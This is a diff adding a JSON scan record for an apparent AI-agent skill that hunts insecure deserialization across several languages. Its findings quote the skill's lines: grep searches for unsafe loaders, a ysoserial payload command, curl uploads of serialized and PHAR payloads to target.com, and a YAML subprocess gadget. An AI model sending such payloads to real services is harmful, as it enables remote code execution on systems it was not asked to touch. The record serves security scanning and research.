@@ -1,0 +1,122 @@
+{
+  "id": "mingyiseclab__mingyi-atlas__src~skills~standard~analyst~deserialization-analysis",
+  "owner": "MingyiSecLab",
+  "repo": "Mingyi-Atlas",
+  "path": "src/skills/standard/analyst/deserialization-analysis",
+  "name": "deserialization-analysis",
+  "description": "Hunt insecure deserialization (CWE-502) across Python pickle, Java ObjectInputStream / Jackson / SnakeYAML, .NET BinaryFormatter / DataContractJson, PHP unserialize, Ruby Marshal/YAML.load, and Node.js vm. Direct path to unauthenticated RCE.",
+  "stars": 14,
+  "category": "security",
+  "commit": "0b45282877b81c4025bfdd984c3a8202e6f68d50",
+  "contentHash": "6ca3fffa824c803cedacf977900f3076a05bbad9e31684f560bc280d29ee9f32",
+  "repoCreatedAt": "2026-05-31T09:53:05Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-16T10:15:16.941Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 34,
+        "excerpt": "grep -rE 'pickle\\.loads?\\(|yaml\\.load\\([^)]*Loader=(FullLoader|Loader)?\\)|torch\\.load\\(' /workspace/src",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 76,
+        "excerpt": "find /workspace/src -name 'pom.xml' -exec grep -lE 'commons-collections|spring-beans|xalan|bcel|commons-beanutils' {} +",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 111,
+        "excerpt": "java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwn' | base64 -w0",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 112,
+        "excerpt": "curl -X POST https://target.com/api/import -H \"Content-Type: application/x-java-serialized-object\" --data-binary @payload.set",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 117,
+        "excerpt": "php -d phar.readonly=0 build-phar.php",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 118,
+        "excerpt": "curl -F 'file=@evil.phar' https://target.com/upload",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 124,
+        "excerpt": "!!python/object/new:subprocess.check_output [[\"id\"]]",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 139,
+        "excerpt": "poc_command=\"curl -X POST https://target.com/api/import --data-binary @payload.bin\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/analyst/deserialization-analysis/SKILL.md",
+        "line": 141,
+        "excerpt": "negative_command=\"curl -X POST https://target.com/api/import --data 'benign'\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "shell": 5,
+      "network": 4
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "0b45282877b81c4025bfdd984c3a8202e6f68d50",
+      "scannedAt": "2026-11-16T10:15:16.941Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
